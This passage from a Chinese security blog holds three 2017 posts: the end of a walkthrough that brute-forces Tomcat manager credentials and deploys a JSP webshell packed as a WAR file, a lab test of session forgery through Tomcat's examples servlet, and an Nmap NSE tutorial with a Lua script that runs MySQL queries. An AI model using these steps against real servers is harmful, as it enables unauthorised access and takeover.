<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x12.jpg" alt="urldecode" />

设置完毕后，我们可以爆破了：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x13.jpg" alt="payloads" />

<h2 id="tomcat-部署war-getshell">Tomcat 部署war getshell</h2>

在获取到令牌后，我们可以进入Tomcat后台了：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x14.jpg" alt="login" />

在这个后台，我们可以操作每个应用的状态……以及读取每个应用下的Session。

但是这都不是最大的安全隐患 :)

下面来讲一下如何制作war包。

<blockquote>
  war包：Java web工程，都是打成war包，进行发布，如果我们的服务器选择TOMCAT等轻量级服务器，一般就打出WAR包进行发布
</blockquote>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x15.jpg" alt="tomcat" />

先准备了一个JSP的一句话木马，安装好JDK环境，我的目录是在<code class="highlighter-rouge">C:\Program Files (x86)\Java\jdk1.8.0_131\bin</code>,这个目录下又个文件叫<code class="highlighter-rouge">jar.exe</code>。

执行:<code class="highlighter-rouge">jar -cvf [war包名称].war 打包目录</code>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x16.jpg" alt="maked" />

我们现在已经打包好了一个WAR包。

找到Tomcat管理页面中的<code class="highlighter-rouge">WAR file to deploy</code>进行上传就可以部署了。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x17.jpg" alt="war" />

应用列表已经出现了我们的目录：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x18.jpg" alt="application" />

访问文件名即可：

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x19.jpg" alt="shell" />

<h2 id="总结">总结</h2>

在爆破的时候发现频率过高会有爆破不成功的现象，最好是调整一下短时间内请求的次数。

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, August 17, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        tomcat &nbsp;,
        
        java &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-08-17/1" > 渗透中tomcat Examples目录中关于Session的分析</a>
    </div>
    <div class="post-excerpt">
      渗透中tomcat Examples目录中关于Session的分析，如何越权
<!--more-->
<h2 id="0x00-前言">0x00 前言</h2>

昨晚安装了Tomcat，想总结一下关于JSP WEB部署方面的安全加固方案，于是搜索到了一个关于tomcat服务安装时自带的一个Examples目录下的Session操作页面产生的安全隐患。

但是参考网上的文章，发现存在一定的鸡肋问题，在文末与大家一起探讨。

位于：<code class="highlighter-rouge">examples/servlets/sessions.html</code>

<h2 id="0x01-环境">0x01 环境</h2>

<ul>
  <li>服务器：Windows Server 2008 R2</li>
  <li>HTTP Server Version：Apache Tomcat/7.0.79</li>
  <li>端口：8080</li>
  <li>IP Address ：192.168.3.204</li>
</ul>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x01.jpg" alt="访问页面" />

访问页面如上所示，我们获得了一个Session ID，这个Session ID是代表了我们当前的一个身份会话。

<h2 id="0x02-关于session">0x02 关于Session</h2>

我们按照网上的参考文章新建几个文件：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>2017/08/17  10:24               201 index.jsp#登录后的页面，如果没有管理员Session，则会跳转到login.jsp
2017/08/17  10:55               274 login.jsp#登录表单页面
2017/08/17  10:25               438 login2.jsp#处理登录页面
</code></pre></div></div>

index.jsp code:

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%</span>
<span class="k">if</span><span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"login"</span><span class="o">)</span>
<span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="n">String</span><span class="o">)</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">"login"</span><span class="o">)).</span><span class="na">equals</span><span class="o">(</span><span class="s">"admin"</span><span class="o">))</span>
<span class="o">{</span>
<span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Login"</span><span class="o">);</span>
<span class="o">}</span><span class="k">else</span><span class="o">{</span>
<span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"login.jsp"</span><span class="o">);</span>
<span class="o">}</span>
<span class="o">%&gt;</span> 
</code></pre></div></div>

login.jsp code:

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/head&gt;</span> 
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"login2.jsp"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="nt">&gt;</span>
username:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"username"</span><span class="nt">&gt;&lt;br&gt;</span>
password:<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"password"</span>
<span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"login"</span><span class="nt">&gt;&lt;br&gt;</span>
<span class="nt">&lt;form&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

login2.jsp code:

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="o">&lt;%</span>
<span class="k">if</span>
<span class="o">(</span><span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"username"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"password"</span><span class="o">)</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
	<span class="n">String</span> <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"username"</span><span class="o">);</span> 
	<span class="n">String</span> <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"password"</span><span class="o">);</span> 
	<span class="c1">//验证身份</span>
	<span class="k">if</span> <span class="o">(</span><span class="n">username</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"admin"</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">password</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"admin"</span><span class="o">))</span> <span class="o">{</span>
	<span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="s">"login"</span><span class="o">,</span><span class="s">"admin"</span><span class="o">);</span>
	<span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"index.jsp"</span><span class="o">);</span>
	<span class="o">}</span>
	<span class="k">else</span> <span class="o">{</span>
	<span class="n">response</span><span class="o">.</span><span class="na">sendRedirect</span><span class="o">(</span><span class="s">"login.jsp"</span><span class="o">);</span>
	<span class="o">}</span>
<span class="o">}</span>
<span class="o">%&gt;</span>
</code></pre></div></div>

以上文件位于站点根目录（Webapps）下的<code class="highlighter-rouge">login</code>文件夹。

我们通过Examples下的Session操作页面来设置一个Session内容，Name为login，Value为admin。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x02.jpg" alt="设置Session" />

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Session ID: 3C907C44B42E097983D71357924FE43D 
Created: Thu Aug 17 12:16:06 CST 2017
Last Accessed: Thu Aug 17 12:37:00 CST 2017
The following data is in your session:
login = admin
</code></pre></div></div>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /login/login.jsp HTTP/1.1
Host: 192.168.3.204:8080
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0 FirePHP/0.7.4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=3C907C44B42E097983D71357924FE43D
x-insight: activate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
</code></pre></div></div>

设置成功后，我们直接访问login下的index.jsp文件，得到响应头如下：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
Location: login.jsp
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 0
Date: Thu, 17 Aug 2017 04:42:14 GMT
</code></pre></div></div>

可以看到并没有利用成功，那么是什么原因呢？

我们看看向Session中设置令牌的页面响应头：

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=DF6A3AFB904871AC3F636C16B87B6364; Path=/examples
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 1131
Date: Thu, 17 Aug 2017 04:47:54 GMT
</code></pre></div></div>
可以发现当前这个响应给Session ID设置了一个有效路径。

我们获取到的Session是一个位于Examples文件夹的有效令牌，当我们用<code class="highlighter-rouge">/examples</code>目录下的令牌访问<code class="highlighter-rouge">/login</code>是无效的。

我们来看看设置Session的页面源代码：

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.servlet.http.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">SessionExample</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span>
    <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ServletException</span>
    <span class="o">{</span>
        <span class="n">response</span><span class="o">.</span><span class="na">setContentType</span><span class="o">(</span><span class="s">"text/html"</span><span class="o">);</span>
        <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>

        <span class="n">HttpSession</span> <span class="n">session</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getSession</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  <span class="c1">// 如果获取不到 Session 就创建一个 Session</span>

        <span class="c1">// print session info</span>

        <span class="n">Date</span> <span class="n">created</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Date</span><span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getCreationTime</span><span class="o">());</span>
        <span class="n">Date</span> <span class="n">accessed</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Date</span><span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getLastAccessedTime</span><span class="o">());</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"ID "</span> <span class="o">+</span> <span class="n">session</span><span class="o">.</span><span class="na">getId</span><span class="o">());</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Created: "</span> <span class="o">+</span> <span class="n">created</span><span class="o">);</span>
        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Last Accessed: "</span> <span class="o">+</span> <span class="n">accessed</span><span class="o">);</span>

        <span class="c1">// set session info if needed</span>

        <span class="n">String</span> <span class="n">dataName</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"dataName"</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">dataName</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">dataName</span><span class="o">.</span><span class="na">length</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">dataValue</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"dataValue"</span><span class="o">);</span>
            <span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="n">dataName</span><span class="o">,</span> <span class="n">dataValue</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="c1">// print session contents</span>

        <span class="n">Enumeration</span> <span class="n">e</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttributeNames</span><span class="o">();</span>
        <span class="k">while</span> <span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">hasMoreElements</span><span class="o">())</span> <span class="o">{</span>
            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">e</span><span class="o">.</span><span class="na">nextElement</span><span class="o">();</span>
            <span class="n">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">name</span><span class="o">).</span><span class="na">toString</span><span class="o">();</span>
            <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">name</span> <span class="o">+</span> <span class="s">" = "</span> <span class="o">+</span> <span class="n">value</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

关于<code class="highlighter-rouge">request.getSession(true)</code>官方好像没有对Session有效路径做介绍，参考的文章中大多都说 Session是全局有效的。

但是在Cookie中是对路径也有限制的。

<h2 id="0x03-成功的一次">0x03 成功的一次</h2>

这一次是成功了，但是项目必须部署在Examples目录下，我将Login下的文件都放入此目录。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x03.jpg" alt="set session" />

获得一个新的Session，并且设置login为admin。

直接访问<code class="highlighter-rouge">http://192.168.3.204:8080/examples/index.jsp</code>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x04.jpg" alt="login" />

可以看到已经进入我们想要的页面了。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-17/0x05.jpg" alt="Cookie" />

并且Session ID相同。

<h2 id="0x04-总结">0x04 总结</h2>

此篇文章涉及到了Session的特性，以及Cookie与Session ID的关系，另外还有一定的疑问存在，<code class="highlighter-rouge">Examples目录下的Session是不是全局的？</code>

此漏洞过于鸡肋，况且也不会有应用部署到这个演示文件夹下，权当安全研究 ~~

再有一个问题就是，我们不知道Session中的Name和Value到底设置成什么才可以伪造其他身份，这些都是开发人员的习惯和标准，又增大了一个利用难度，所以说：鸡肋！鸡肋！鸡肋！

后文继续总结Tomcat的其他安全隐患……

    </div>
    <div class="posted">
      posted on
      <span class="posted-on">

        Thursday, August 17, 2017
      </span>
      <span class="in">
        in
      </span>
      <span class="categories-on">
        
        tomcat &nbsp;,
        
        java &nbsp;
        
      </span>
    </div>
  </div>
  
  <div class="post-box">
    <div class="post-title">
    <a class="post-title" href="/archivers/2017-08-07/1" > Nmap扩展开发</a>
    </div>
    <div class="post-excerpt">
      Nmap进行漏洞扫描，编写扩展
<!--more-->
<h2 id="0x00-资产扫描汇总实时监控">0x00 资产扫描、汇总、实时监控</h2>
资产扫描能够有利于企业内部查看终端、监控终端、对终端进行安全加固。周期性的扫描能有效快速修补漏洞、降低办公网络风险。

<h3 id="如何进行汇总实时监控">如何进行汇总、实时监控？</h3>

在我们要进行汇总的时候，有如下几个可以考虑的方案。

<ul>
  <li>PDF</li>
  <li>Excel</li>
  <li>Text</li>
  <li>Database / SQL</li>
</ul>

PDF &amp;&amp; Excel &amp;&amp; Text 都不适合实时View

Database / SQL 有利于生成数据汇总、图表，并且可移植性很高。

Database -&gt; Web -&gt; Excel/PDF …. 可行性都变得高了起来

实时监控采用任务调度，数据库采用IO效率高的NO SQL产品，详细信息采用普通的数据库：MySQL、SQL Server、Oracel…

<h2 id="0x01-解决方案">0X01 解决方案</h2>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x01.png" alt="解决方案" />

<h3 id="nmap简介目录结构扫描流程nse-engine">Nmap简介、目录结构、扫描流程、Nse Engine</h3>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/nmap.jpg" alt="Nmap" />

<h3 id="0x02-简介">0X02 简介</h3>

Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。

<h3 id="目录结构">目录结构</h3>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x02.png" alt="目录结构" />

<table>
    <tr>
        <td>文件名称</td>
        <td>文件说明</td>
    </tr>
    <tr>
		<td>nmap.dtd</td>
		<td>
		Nmap输出的XML格式内部变量的定义
		</td>
    </tr>
    <tr>
		<td>nmap-mac-prefixes</td>
		<td>是Nmap针对不同终端的MAC地址所收集的指纹（常用于内网扫描）</td>
    </tr>
        <tr>
		<td>nmap-os-db</td>
		<td>Nmap针对不同终端的操作系统返回的数据包特征所收集的指纹</td>
    </tr>
        <tr>
		<td>nmap-payloads</td>
		<td>是Nmap在扫描时将payload向扫描目标发送的数据</td>
    </tr>
        <tr>
		<td>nmap-protocols</td>
		<td>Nmap 用来存储目标端口对应服务描述的db文件</td>
    </tr>
        <tr>
		<td>nmap-rpc</td>
		<td>Nmap在扫描的时候调用RPC进行服务发现的db文件</td>
    </tr>
    <tr>
		<td>nmap-service-probes</td>
		<td>Nmap针对响应数据包内容进行正则匹配从而判断服务的db文件</td>
    </tr>
    <tr>
		<td>nmap-services</td>
		<td>Nmap存储一个TCP/UDP服务的db文件</td>
    </tr>
    <tr>
		<td>nmap-xsl </td>
		<td>Nmap导出xml文件的模板</td>
    </tr>
    <tr>
		<td>nselib</td>
		<td>Nmap的脚本引擎扩展库</td>
    </tr>
    <tr>
		<td></td>
		<td></td>
    </tr>
    <tr>
		<td>nse_main.lua</td>
		<td>在调用任何Nmap脚本都会提前自动调用的预处理Lua脚本</td>
    </tr>
    <tr>
		<td>Scripts</td>
		<td>Nmap的脚本扩展</td>
    </tr>
</table>

<h3 id="扫描流程-v1">扫描流程 V1</h3>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x03.png" alt="扫描流程 V1" />

<h3 id="扫描流程-v2">扫描流程 V2</h3>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x05.png" alt="扫描流程 V2" />

<h3 id="nse-enginenmap-脚本引擎">Nse Engine（Nmap 脚本引擎）</h3>

Nmap Nse 脚本引擎用于针对发现的OS、主机、端口进行不同的操作，例如：Fuzz测试、漏洞发现、漏洞利用等。这对Nmap又增添了一大亮点，所以说Nmap不只是一个扫描工具，在黑客的手中，更是一款爱不释手的渗透工具。

<h3 id="nse-engine的执行流程">Nse Engine的执行流程</h3>

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x04.png" alt="Nse流程" />

<h2 id="0x03-一个简单的扩展打开世界">0X03 一个简单的扩展打开世界</h2>

https://nmap.org/book/nse-api.html

Nmap扩展主要由以下几个变量构成。编码方式：变量绑定函数

<table>
	<tr>
		<td>变量名称</td>
		<td>函数执行顺序</td>
	</tr>
	<tr>
		<td>prerule()</td>
		<td>最先执行</td>
	</tr>
	<tr>
		<td>hostrule(host)</td>
		<td>第二步执行</td>
	</tr>
	<tr>
		<td>portrule(host,port)</td>
		<td>第二步执行</td>
	</tr>
	<tr>
		<td>postrule()</td>
		<td>最后一步执行</td>
	</tr>
</table>

顺序为：<code class="highlighter-rouge">Prerule -&gt; Hostrule or Portrule -&gt; Action -&gt; Postrule</code>

当 <code class="highlighter-rouge">Hostrule</code> 或者 <code class="highlighter-rouge">Portrule</code> 的绑定函数返回<code class="highlighter-rouge">true</code>的时候，都会执行一次<code class="highlighter-rouge">Action</code>的绑定函数。

<img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-08-07/0x06.png" alt="函数流程" />

<h3 id="入库">入库</h3>

获取参数-&gt;连接数据库 -&gt; 采用不同条件判断期望获取到的值-&gt;执行SQL

获取参数：stdnse lib [stdnse.get_script_args()]

连接数据库：mysql lib

获取socket : nmap socket lib

socket = nmap.new_socket()  – 获得一个新的socket套接字

socket:set_timeout(1000) – 设置超时时间

socket:connect(host_ip,port_number) – 连接目标

socket:close() – 关闭套接字连接

我自己根据API封装了一个执行MySQL Query的扩展：

<div class="language-lua highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">local</span> <span class="n">mysql</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"mysql"</span>
<span class="kd">local</span> <span class="n">nmap</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"nmap"</span>
<span class="kd">local</span> <span class="n">stdnse</span> <span class="o">=</span> <span class="nb">require</span> <span class="s2">"stdnse"</span>

<span class="n">description</span> <span class="o">=</span><span class="s">[[
This is a Lua script that performs the MySQL statement.
]]</span>
<span class="n">author</span> <span class="o">=</span> <span class="s2">"China CoraLab payloads"</span>
<span class="n">license</span> <span class="o">=</span> <span class="s2">"Same as Nmap--See https://nmap.org/book/man-legal.html"</span>
<span class="n">categories</span> <span class="o">=</span> <span class="p">{</span><span class="s2">"external"</span><span class="p">}</span>

<span class="n">socket</span> <span class="o">=</span> <span class="n">nmap</span><span class="p">.</span><span class="n">new_socket</span><span class="p">()</span>
<span class="n">socket</span><span class="p">:</span><span class="n">set_timeout</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
<span class="n">try</span> <span class="o">=</span> <span class="n">nmap</span><span class="p">.</span><span class="n">new_try</span><span class="p">(</span><span class="k">function</span><span class="p">()</span> <span class="n">socket</span><span class="p">:</span><span class="n">close</span><span class="p">()</span> <span class="k">end</span><span class="p">)</span>
<span class="n">optionsConfig</span> <span class="o">=</span> <span class="p">{</span>
    <span class="n">username</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">,</span>
    <span class="n">password</span> <span class="o">=</span> <span class="s2">"root"</span><span class="p">,</span>
    <span class="n">database</span> <span class="o">=</span> <span class="s2">"test"</span><span class="p">,</span>
    <span class="n">sqlQuery</span> <span class="o">=</span> <span class="s2">"SELECT MD5('admin'),"</span><span class="p">,</span>
    <span class="n">host</span>     <span class="o">=</span> <span class="s2">"127.0.0.1"</span><span class="p">,</span>
    <span class="n">port</span>     <span class="o">=</span>  <span class="mi">3306</span>
<span class="p">}</span>


<span class="n">optionsConfig</span><span class="p">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".username"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">username</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".password"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">password</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">database</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".database"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">database</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">host</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".host"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">host</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">port</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".port"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">port</span>
<span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span> <span class="o">=</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">get_script_args</span><span class="p">(</span><span class="n">SCRIPT_NAME</span> <span class="o">..</span> <span class="s2">".sql"</span><span class="p">)</span> <span class="ow">or</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span>

<span class="k">function</span> <span class="nf">mysqlLogin</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">)</span>
    <span class="kd">local</span> <span class="n">status</span><span class="p">,</span> <span class="n">response</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">receiveGreeting</span><span class="p">(</span> <span class="n">socket</span> <span class="p">)</span>
    <span class="k">if</span> <span class="p">(</span> <span class="ow">not</span><span class="p">(</span><span class="n">status</span><span class="p">)</span> <span class="p">)</span> <span class="k">then</span>
        <span class="k">return</span> <span class="n">response</span>
    <span class="k">end</span>
    <span class="k">return</span> <span class="n">mysql</span><span class="p">.</span><span class="n">loginRequest</span><span class="p">(</span> <span class="n">socket</span><span class="p">,</span> <span class="p">{</span> <span class="n">authversion</span> <span class="o">=</span> <span class="s2">"post41"</span><span class="p">,</span> <span class="n">charset</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">charset</span> <span class="p">},</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">salt</span> <span class="p">)</span>
<span class="k">end</span>
<span class="n">portrule</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">true</span>
<span class="k">end</span>
<span class="n">action</span> <span class="o">=</span> <span class="k">function</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">)</span>
    <span class="k">if</span><span class="p">(</span><span class="n">socket</span><span class="p">:</span><span class="n">connect</span><span class="p">(</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">host</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
    <span class="k">then</span>
        <span class="kd">local</span> <span class="n">status</span><span class="p">,</span><span class="n">response</span> <span class="o">=</span> <span class="n">mysqlLogin</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">username</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">password</span><span class="p">)</span>
        <span class="k">if</span><span class="p">(</span><span class="n">status</span><span class="p">)</span>
        <span class="k">then</span>
            <span class="kd">local</span> <span class="n">status</span><span class="p">,</span> <span class="n">rs</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">sqlQuery</span><span class="p">(</span> <span class="n">socket</span><span class="p">,</span> <span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span> <span class="p">)</span>
            <span class="n">socket</span><span class="p">:</span><span class="n">close</span><span class="p">()</span>
            <span class="kd">local</span> <span class="n">result</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">formatResultset</span><span class="p">(</span><span class="n">rs</span><span class="p">,</span> <span class="p">{</span> <span class="n">noheaders</span> <span class="o">=</span> <span class="kc">true</span> <span class="p">})</span>
            <span class="n">stdnse</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="nb">string.format</span><span class="p">(</span><span class="s2">"[*]Query is %s | Result is  %s"</span><span class="p">,</span><span class="n">optionsConfig</span><span class="p">.</span><span class="n">sqlQuery</span><span class="p">,</span><span class="n">result</span><span class="p">))</span>
            <span class="k">return</span> <span class="n">stdnse</span><span class="p">.</span><span class="n">format_output</span><span class="p">(</span><span class="kc">true</span><span class="p">,</span><span class="n">result</span><span class="p">)</span>
        <span class="k">end</span>
    <span class="k">else</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"Connect to mysql Failed !!!"</span><span class="p">)</span>
        <span class="k">return</span> <span class="kc">nil</span>
    <span class="k">end</span>
<span class="k">end</span>
